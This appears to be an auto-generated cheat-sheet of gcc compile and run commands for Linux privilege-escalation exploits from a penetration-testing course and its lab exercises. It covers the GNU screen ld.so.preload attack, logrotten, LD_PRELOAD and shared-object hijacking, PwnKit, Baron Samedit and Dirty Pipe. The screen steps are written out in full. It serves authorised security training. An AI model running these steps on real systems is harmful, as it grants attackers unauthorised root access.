# Gcc / cross-compile

% gcc, mingw, compile, cpts

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - screen_exploit_pocsh
#cat/CODE #cpts
```
echo "~ gnu/screenroot ~"
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - screen_exploit_pocsh-2
#cat/CODE #cpts
```
echo "[+] First, we create our shell and library..."
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - screen_exploit_pocsh-3
#cat/CODE #cpts
```
cat <<EOF /tmp/libhax.c
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - screen_exploit_pocsh-4
#cat/CODE #cpts
```
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - screen_exploit_pocsh-5
#cat/CODE #cpts
```
cat <<EOF /tmp/rootshell.c
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - screen_exploit_pocsh-6
#cat/CODE #cpts
```
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - screen_exploit_pocsh-8
#cat/CODE #cpts
```
cd /etc
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - screen_exploit_pocsh-9
#cat/CODE #cpts
```
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so" # newline needed
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - screen_exploit_pocsh-11
#cat/CODE #cpts
```
screen -ls # screen itself is setuid, so...
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - logrotate
#cat/CODE #cpts
To exploit `logrotate`, we need some requirements that we have to fulfill. 1. we need `write` permissions on the log files 2. logrotate must run as a privileged user or `root` 3. vulnerable versions: - 3.8.6 - 3.11.0 - 3

```
:~$ gcc logrotten.c -o logrotten
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - weak-nfs-privileges
#cat/CODE #cpts
```
:/tmp$ gcc shell.c -o shell
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - kernel-exploit-example
#cat/CODE #cpts
We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for `linux 4.4.0-116-generic exploit` comes up with [this](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. Next

```
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - ld_preload-privilege-escalation
#cat/CODE #cpts
We can compile this as follows:

```
:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - shared-object-hijacking
#cat/CODE #cpts
The `dbquery` function sets our user id to 0 (root) and executing `/bin/sh` when called. Compile it using [GCC](https://linux.die.net/man/1/gcc).

```
:~$ gcc src.c -fPIC -shared -o /development/libshared.so
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - sudo
#cat/CODE #cpts
The interesting thing about this vulnerability was that it had been present for over ten years until it was discovered. There is also a public [Proof-Of-Concept](https://github.com/blasty/CVE-2021-3156) that can be used

```
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - sudo-2
#cat/CODE #cpts
The interesting thing about this vulnerability was that it had been present for over ten years until it was discovered. There is also a public [Proof-Of-Concept](https://github.com/blasty/CVE-2021-3156) that can be used

```
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - polkit
#cat/CODE #cpts
In the `pkexec` tool, the memory corruption vulnerability with the identifier [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) was found, also known as [Pwnkit](https://blog.qualys.com/vulner

```
:~$ gcc cve-2021-4034-poc.c -o poc
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - proof-of-concept
#cat/CODE #cpts
```
:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ
#cat/CODE #cpts
Upon connecting, students need to navigate into the newly transferred directory, compiling the `logrotten.c` file into an executable:

```
cd logrotten/
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-2
#cat/CODE #cpts
Upon connecting, students need to navigate into the newly transferred directory, compiling the `logrotten.c` file into an executable:

```
gcc -o logrotten logrotten.c
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-3
#cat/CODE #cpts
```
:~/logrotten$ gcc -o logrotten logrotten.c
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - escalate-privileges-using-ld_preload-technique-submit-the-contents-of-
#cat/CODE #cpts
Subsequently, students need to compile the `C` code file using `gcc`:

```
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-4
#cat/CODE #cpts
Subsequently, students need to navigate into the transferred directory, where they will compile and run the exploit:

```
cd CVE-2021-4034/
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-5
#cat/CODE #cpts
Subsequently, students need to navigate into the transferred directory, where they will compile and run the exploit:

```
gcc -o poc cve-2021-4034-poc.c
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-6
#cat/CODE #cpts
Subsequently, students need to navigate into the transferred directory, where they will compile and run the exploit:

```
./poc
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - escalate-the-privileges-and-submit-the-contents-of-flagtxt-as-the-answ-7
#cat/CODE #cpts
```
:~/CVE-2021-4034$ gcc -o poc cve-2021-4034-poc.c
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - escalate-privileges-to-root-on-the-mgmt01-host-submit-the-contents-of-
#cat/CODE #cpts
Then, inside of `MGMT01`, students need to paste the exploit code inside a file, compile it with `gcc`, and make it executable:

```
gcc exploit.c -o dirtypipe
```

## Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - Gcc / cross-compile - escalate-privileges-to-root-on-the-mgmt01-host-submit-the-contents-of--2
#cat/CODE #cpts
```
:~$ gcc exploit.c -o dirtypipe
```

